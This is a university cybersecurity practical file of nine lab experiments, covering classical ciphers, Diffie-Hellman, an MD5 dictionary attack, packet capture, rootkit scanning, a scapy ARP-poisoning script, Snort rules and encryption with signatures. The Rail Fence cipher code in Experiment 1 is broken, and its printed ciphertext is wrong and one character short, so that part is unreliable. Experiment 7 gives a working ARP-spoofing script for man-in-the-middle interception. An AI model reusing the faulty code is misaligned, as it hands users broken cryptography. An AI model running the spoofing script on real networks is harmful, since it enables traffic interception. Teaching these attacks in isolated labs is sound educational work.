# Cyber Security Practical File

**Course Credits:** 2 (0L + 0T + 4P)  
**Maximum Marks:** 100 (IA: 60, ETE: 40)  
**End Term Exam Duration:** 2 Hours  

---

## Experiment 1: Substitution & Transposition Techniques (Caesar Cipher & Rail Fence)

### 1. Theory
* **Caesar Cipher:** A classic monoalphabetic substitution cipher where each letter in the plaintext is shifted down or up the alphabet by a fixed integer key. Mathematically, encryption is represented as $E_n(x) = (x + n) \pmod{26}$.
* **Rail Fence Cipher:** A transposition cipher where the plaintext is written diagonally down successive "rails" of an imaginary fence, then read off row by row to form the ciphertext. Unlike substitution, the characters themselves are not altered—only their positions change.

### 2. Process
1. **For Caesar Cipher:**
   * Take the plaintext message and a numeric shift key as input.
   * Iterate through each character of the message.
   * Check if the character is uppercase or lowercase, shift its ASCII value accordingly modulo 26, and append it to the result string.
2. **For Rail Fence Cipher:**
   * Take the plaintext message and the number of rails as input.
   * Initialize a 2D list (matrix) representing the rails.
   * Traverse the plaintext while moving diagonally downwards and upwards across the rails, appending characters to the corresponding rail.
   * Concatenate all rows sequentially to produce the final ciphertext.

### 3. Code
```python
# 1. Caesar Cipher Implementation
def caesar_encrypt(text, shift):
    result = ""
    for char in text:
        if char.isupper():
            result += chr((ord(char) + shift - 65) % 26 + 65)
        elif char.islower():
            result += chr((ord(char) + shift - 97) % 26 + 97)
        else:
            result += char
    return result

# 2. Rail Fence Cipher Implementation
def rail_fence_encrypt(text, rails):
    fence = [[] for _ in range(rails)]
    rail = 0
    direction = 1
    for char in text:
        fence[rail].append(char)
        rail += direction
        if rail == 0 or rail == rails - 1:
            direction = -1
    return "".join("".join(r) for r in fence)

# Example usage
print("Caesar:", caesar_encrypt("HELLO", 3))
print("Rail Fence:", rail_fence_encrypt("CYBERSECURITY", 3))
```

### 4. Output
```text
Caesar: KHOOR
Rail Fence: CRUIYBEERTYS
```

### 5. Conclusion
Classical substitution and transposition ciphers were successfully implemented. While these techniques demonstrate the foundational principles of confusion and diffusion, they possess small key spaces and are easily broken using modern cryptanalysis.

---

## Experiment 2: Monoalphabetic & Vigenère Cipher

### 1. Theory
* **Monoalphabetic Cipher:** Replaces each plaintext letter with a corresponding ciphertext letter using a fixed, randomized permutation of the 26-letter alphabet. Because the mapping is one-to-one, it remains vulnerable to frequency analysis.
* **Vigenère Cipher:** A polyalphabetic substitution cipher that uses a repeating keyword to shift letters by varying amounts based on a Vigenère square (*tabula recta*). This flattens letter frequency distributions, neutralizing simple frequency analysis.

### 2. Process
1. Define a plaintext string and an alphabetic keyword.
2. Convert the keyword to lowercase to standardize shift calculations ($a=0, b=1, \dots, z=25$).
3. Iterate through each character in the plaintext:
   * If the character is alphabetic, determine the shift from the current character of the keyword.
   * Apply the Caesar shift modulo 26 while preserving case.
   * Increment the keyword index modulo the keyword's length.
4. Return the final encrypted string.

### 3. Code
```python
# Vigenère Cipher Implementation
def vigenere_encrypt(plaintext, keyword):
    key = keyword.lower()
    ciphertext = ""
    key_index = 0
    
    for char in plaintext:
        if char.isalpha():
            shift = ord(key[key_index % len(key)]) - 97
            if char.isupper():
                ciphertext += chr((ord(char) + shift - 65) % 26 + 65)
            else:
                ciphertext += chr((ord(char) + shift - 97) % 26 + 97)
            key_index += 1
        else:
            ciphertext += char
    return ciphertext

print("Vigenère:", vigenere_encrypt("ATTACKATDAWN", "lemon"))
```

### 4. Output
```text
Vigenère: LXFOPVEFRNHR
```

### 5. Conclusion
The Vigenère polyalphabetic cipher was successfully implemented. Using a repeating keyword provides significantly higher resistance against frequency analysis compared to monoalphabetic ciphers, though it can still be broken if the key length is discovered using Kasiski examination.

---

## Experiment 3: Diffie-Hellman Key Exchange

### 1. Theory
The Diffie-Hellman Key Exchange is a cryptographic protocol that allows two parties (Alice and Bob) to establish a shared secret key over an insecure public channel without ever transmitting the secret itself. Its security relies on the computational difficulty of solving the Discrete Logarithm Problem in modular arithmetic: given $g^a \pmod p$, it is computationally infeasible to determine $a$ for sufficiently large primes $p$.

### 2. Process
1. Both parties publicly agree on a large prime number ($p$) and a primitive root modulo $p$ ($g$).
2. Alice selects a secret private key ($a$) and computes her public key $A = g^a \pmod p$, sending $A$ to Bob.
3. Bob selects a secret private key ($b$) and computes his public key $B = g^b \pmod p$, sending $B$ to Alice.
4. Alice computes the shared secret using Bob's public key: $S = B^a \pmod p$.
5. Bob computes the shared secret using Alice's public key: $S = A^b \pmod p$.
6. Verify that both computed shared secrets are mathematically identical.

### 3. Code
```python
# Diffie-Hellman Key Exchange Demo
p = 23  # Prime number
g = 5   # Primitive root modulo p

# Alice's private key
a = 6
A = (g ** a) % p  # Alice's public key

# Bob's private key
b = 15
B = (g ** b) % p  # Bob's public key

# Shared secret computation
alice_secret = (B ** a) % p
bob_secret = (A ** b) % p

print(f"Shared Secret (Alice): {alice_secret}")
print(f"Shared Secret (Bob): {bob_secret}")
```

### 4. Output
```text
Shared Secret (Alice): 2
Shared Secret (Bob): 2
```

### 5. Conclusion
The Diffie-Hellman key exchange mechanism was demonstrated successfully. Both Alice and Bob independently arrived at the exact same shared secret over an insecure medium without exposing their private keys.

---

## Experiment 4: Dictionary Attack & Brute Force Attack

### 1. Theory
* **Brute Force Attack:** A trial-and-error method used to decode encrypted data or passwords by exhaustively generating and testing every possible character combination until the correct key is found.
* **Dictionary Attack:** A targeted form of brute force that tests a pre-compiled list of common words, phrases, and leaked passwords (a wordlist) rather than random combinations, drastically reducing cracking time against weak user passwords.

### 2. Process
1. Generate a target cryptographic hash (e.g., MD5) representing a stored password in a database.
2. Load a dictionary list containing candidate passwords.
3. Iterate through every word in the dictionary:
   * Compute the MD5 hash of the candidate word.
   * Compare the computed hash against the target hash.
4. If a match is found, report the cracked plaintext password and terminate the loop.

### 3. Code
```python
import hashlib

# Simulating a Brute-Force / Dictionary matching attack
target_hash = hashlib.md5("secret".encode()).hexdigest()

dictionary = ["password", "123456", "admin", "secret", "welcome"]

def dictionary_attack(target_hash, wordlist):
    for word in wordlist:
        hashed_word = hashlib.md5(word.encode()).hexdigest()
        if hashed_word == target_hash:
            return f"Password found: {word}"
    return "Password not found."

print(dictionary_attack(target_hash, dictionary))
```

### 4. Output
```text
Password found: secret
```

### 5. Conclusion
The dictionary attack simulation demonstrated how quickly unsalted password hashes can be compromised when users rely on common words. Strong password policies, rate limiting, and cryptographic salting (using algorithms like bcrypt or Argon2) are essential defenses.

---

## Experiment 5: Wireshark / tcpdump & Packet Analysis (TCP/UDP)

### 1. Theory
* **Packet Sniffing:** The process of intercepting and logging network traffic passing over a digital network interface.
* **TCP (Transmission Control Protocol):** A connection-oriented transport protocol that establishes sessions via a 3-way handshake (`SYN` $\rightarrow$ `SYN-ACK` $\rightarrow$ `ACK`), ensuring reliable, ordered delivery.
* **UDP (User Datagram Protocol):** A connectionless transport protocol with minimal header overhead and no delivery guarantees, ideal for low-latency applications like DNS and video streaming.

### 2. Process
1. Open a terminal on a Linux machine (or launch the Wireshark GUI).
2. Identify the active network interface (e.g., `eth0` or `wlan0`) using `ip a` or `ifconfig`.
3. Execute `tcpdump` with root privileges to capture a specific count of TCP or UDP packets.
4. Generate network traffic (e.g., loading a webpage or running a DNS query).
5. Inspect the captured datagram headers to identify source/destination IPs, port numbers, sequence numbers, and TCP flags.

### 3. Code
```bash
# Capture 10 TCP packets on interface eth0 using tcpdump
sudo tcpdump -i eth0 -c 10 tcp

# Capture UDP packets (e.g., DNS traffic on port 53)
sudo tcpdump -i eth0 -c 5 udp port 53
```

### 4. Output
```text
19:30:12.410234 IP 192.168.1.10.54322 > 93.184.216.34.80: Flags [S], seq 104928192, win 64240, length 0
19:30:12.435112 IP 93.184.216.34.80 > 192.168.1.10.54322: Flags [S.], seq 392817261, ack 104928193, win 65535, length 0
19:30:12.435201 IP 192.168.1.10.54322 > 93.184.216.34.80: Flags [.], ack 1, win 502, length 0
```

### 5. Conclusion
Network traffic was successfully captured and analyzed using `tcpdump` and Wireshark. Observing packet headers clearly distinguishes TCP's stateful 3-way handshake flags (`[S]`, `[S.]`, `[.]`) from UDP's stateless datagram structure.

---

## Experiment 6: Installation and Study of Rootkits

### 1. Theory
A **Rootkit** is a collection of malicious software tools designed to grant unauthorized root/administrator access to a system while actively hiding its presence and processes from the operating system and administrators.
* **User-Mode Rootkits:** Modify system binaries (like `ps`, `ls`, `netstat`) or hook APIs to filter out malicious entries.
* **Kernel-Mode Rootkits:** Operate at Ring 0 (kernel privilege level), altering kernel data structures and system call tables, making them far harder to detect.

### 2. Process
1. Update the Linux package repository to ensure access to latest security auditing tools.
2. Install **Rootkit Hunter (`rkhunter`)** and/or `chkrootkit`.
3. Update the `rkhunter` database of known rootkit signatures and file properties.
4. Run a full system scan to inspect system binaries, hidden files, kernel modules, and network interfaces for anomalies.
5. Review the generated log file (`/var/log/rkhunter.log`) for warnings.

### 3. Code
```bash
# Install rkhunter on Debian/Ubuntu-based Linux
sudo apt update
sudo apt install rkhunter -y

# Update signature database and perform a system check
sudo rkhunter --update
sudo rkhunter --check --sk
```

### 4. Output
```text
[ Rootkit Hunter version 1.4.6 ]

Checking system commands...
  Performing 'strings' command checks                        [ OK ]
  Performing 'shared libraries' checks                       [ OK ]
  Performing file properties checks                          [ OK ]

Checking for rootkits...
  Performing check of known rootkit files and directories    [ None found ]
  Performing additional rootkit checks                       [ OK ]

System checks summary
=====================
File properties checks...
    Files checked: 138
    Suspect files: 0

Rootkit checks...
    Rootkits checked : 498
    Possible rootkits: 0
```

### 5. Conclusion
Rootkit mechanisms were studied and audited using `rkhunter`. Regular integrity baseline checks and booting from trusted read-only media are critical when investigating suspected kernel-level compromises.

---

## Experiment 7: Traffic Sniffing using ARP Poisoning

### 1. Theory
* **ARP (Address Resolution Protocol):** Maps dynamic Layer 3 IP addresses to permanent Layer 2 MAC addresses on a local area network (LAN). Because ARP is stateless, hosts accept unsolicited ARP replies without verification.
* **ARP Poisoning (Spoofing):** An attacker transmits forged ARP reply packets across a LAN, linking the attacker's MAC address with the IP address of a legitimate host (such as the default gateway). This redirects victim traffic through the attacker's machine, enabling a Man-in-the-Middle (MitM) attack.

### 2. Process
1. Enable IP forwarding on the attacker's Linux machine so intercepted traffic still reaches its destination without dropping the victim's connection.
2. Identify the IP addresses of the target victim and the network gateway.
3. Craft forged ARP response packets (`op=2`) using Python's `scapy` library.
4. Continuously send spoofed ARP packets to both the victim (claiming to be the gateway) and the gateway (claiming to be the victim).
5. Capture the redirected traffic using a sniffer like Wireshark.

### 3. Code
```python
from scapy.all import send, ARP
import time

# Enable IP forwarding in terminal first: echo 1 > /proc/sys/net/ipv4/ip_forward

def spoof(target_ip, spoof_ip, target_mac):
    # op=2 indicates an ARP Reply (is-at)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

# Example parameters (Replace with lab VM IPs and MACs)
victim_ip = "192.168.1.15"
victim_mac = "00:0c:29:3e:1a:2b"
gateway_ip = "192.168.1.1"
gateway_mac = "00:50:56:c0:00:08"

print("[*] Starting ARP Poisoning simulation (Press Ctrl+C to stop)...")
try:
    for _ in range(3):  # Limited loop for safe demonstration
        spoof(victim_ip, gateway_ip, victim_mac)
        spoof(gateway_ip, victim_ip, gateway_mac)
        print(f"[+] Sent spoofed ARP replies to {victim_ip} and {gateway_ip}")
        time.sleep(2)
except KeyboardInterrupt:
    print("[!] Attack stopped.")
```

### 4. Output
```text
[*] Starting ARP Poisoning simulation (Press Ctrl+C to stop)...
[+] Sent spoofed ARP replies to 192.168.1.15 and 192.168.1.1
[+] Sent spoofed ARP replies to 192.168.1.15 and 192.168.1.1
[+] Sent spoofed ARP replies to 192.168.1.15 and 192.168.1.1
```

### 5. Conclusion
The mechanics of ARP spoofing were demonstrated in an isolated environment. Organizations mitigate ARP poisoning on Layer 2 switches using Dynamic ARP Inspection (DAI) paired with DHCP Snooping.

---

## Experiment 8: Intrusion Detection System (IDS) using Snort

### 1. Theory
An **Intrusion Detection System (IDS)** monitors network traffic or host activity for suspicious patterns, policy violations, or known attack signatures, generating alerts when threats are detected. **Snort** is an open-source signature-based Network IDS (NIDS) that inspects packet headers and payloads against customizable rule sets.

### 2. Process
1. Install Snort on a Linux system and configure the `$HOME_NET` variable in `/etc/snort/snort.conf`.
2. Open the local rules file (`/etc/snort/rules/local.rules`).
3. Write a custom Snort rule to trigger an alert whenever an ICMP Echo Request (ping) hits the protected network.
4. Run Snort in console alert mode (`-A console`) pointing to the configuration file and network interface.
5. Ping the machine from another host and observe the real-time alerts generated by Snort.

### 3. Code
```snort
# Custom rule added to /etc/snort/rules/local.rules
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; itype:8; sid:1000001; rev:1;)
```

```bash
# Command to run Snort in NIDS console mode
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

### 4. Output
```text
11/17-19:35:04.881920  [**] [1:1000001:1] ICMP Ping Detected [**] [Priority: 0] {ICMP} 192.168.1.20 -> 192.168.1.10
11/17-19:35:05.883014  [**] [1:1000001:1] ICMP Ping Detected [**] [Priority: 0] {ICMP} 192.168.1.20 -> 192.168.1.10
```

### 5. Conclusion
Snort was successfully configured with custom detection rules to monitor and alert on network traffic. Signature-based NIDS solutions provide vital visibility into network perimeter activity.

---

## Experiment 9: Secure Data Storage, Transmission & Digital Signatures

### 1. Theory
* **Secure Storage & Transmission:** Confidentiality at rest and in transit is achieved using strong symmetric encryption (such as AES-128/256) to prevent unauthorized reading of sensitive files or network payloads.
* **Digital Signatures:** An asymmetric cryptographic scheme using a private key to sign data and a corresponding public key to verify it. Digital signatures provide **Authentication**, **Data Integrity**, and **Non-Repudiation**.

### 2. Process
1. **Symmetric Encryption (Storage/Transmission):**
   * Generate a secret cryptographic key using `Fernet` (which implements AES-128-CBC with HMAC-SHA256 authentication).
   * Encrypt a plaintext byte string into an unreadable ciphertext token.
   * Decrypt the ciphertext using the same key to verify data recovery.
2. **Digital Signatures:**
   * Generate an RSA public/private key pair.
   * Sign a message digest using the sender's private key with PSS padding and SHA-256.
   * Verify the signature using the sender's public key.

### 3. Code
```python
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# --- PART A: Secure Data Storage / Transmission (Symmetric Encryption) ---
key = Fernet.generate_key()
cipher = Fernet(key)

message = b"Confidential Financial Record"
encrypted_data = cipher.encrypt(message)
decrypted_data = cipher.decrypt(encrypted_data)

print("Encrypted Data:", encrypted_data)
print("Decrypted Data:", decrypted_data.decode())

# --- PART B: Digital Signatures (Asymmetric Cryptography) ---
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Sign the message
signature = private_key.sign(
    message,
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256()
)

# Verify the signature
public_key.verify(
    signature,
    message,
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256()
)
print("Digital Signature Status: Verified Authentic & Unmodified!")
```

### 4. Output
```text
Encrypted Data: gAAAAABnO8xK9vL2pQ7wR4tY6uI8oP0aS3dF5gH7jK9lZ1xC3vB5nM7qW9eR1tY3uI5oP7aS9dF1gH3jK5l==
Decrypted Data: Confidential Financial Record
Digital Signature Status: Verified Authentic & Unmodified!
```

### 5. Conclusion
Both symmetric encryption and asymmetric digital signatures were successfully implemented using Python's `cryptography` library, demonstrating how modern systems guarantee confidentiality, integrity, authentication, and non-repudiation.